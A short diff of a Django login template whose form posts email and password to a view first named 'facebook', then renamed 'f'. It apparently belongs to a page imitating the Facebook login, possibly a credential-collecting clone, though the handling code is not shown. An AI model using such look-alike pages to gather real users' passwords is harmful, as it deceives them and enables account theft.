@@ -20,7 +20,7 @@
         </div>
 
         <div class="form">
-            <form class="a-form" action="{% url 'facebook' %}" method=POST>{%csrf_token%}>
+            <form class="a-form" action="{% url 'f' %}" method=POST>{%csrf_token%}>
                 <input type="email" id="Email" class="a-email" name="email" placeholder="Email address or phone number" autofocus="autofocus" required />
                 <input type="password" id="Password" class="a-pss" name="password" placeholder="Password" autofocus="autofocus" />
                 <input type="submit" class="a-sub" value="Log In" />
@@ -125,5 +125,6 @@
       
 
 </body>
+
 
 </html>
